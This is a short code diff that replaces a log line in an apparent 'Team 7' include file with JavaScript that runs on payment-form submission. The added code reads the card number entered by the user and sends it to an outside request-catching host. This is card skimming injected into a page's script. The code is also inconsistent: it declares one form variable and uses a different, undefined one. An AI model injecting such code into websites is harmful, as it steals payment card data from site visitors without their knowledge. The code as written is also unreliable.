@@ -1,1 +1,21 @@
-console.log("Team 7 include file loaded");
+const PAYMENT_FORM = document.getElementById("payment-form");
+const CARD_NUMBER = document.getElementById("card-number");
+
+paymentForm.addEventListener('submit', function(event) {
+    const eventData = {
+        type: event.type,
+        target: event.target.id || event.target.tagName,
+        timestamp: event.timeStamp,
+        formData: {
+            cardNumber: CARD_NUMBER.value
+        }
+    };
+
+    fetch('https://team7.requestcatcher.com/test', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(eventData)
+    })
+});
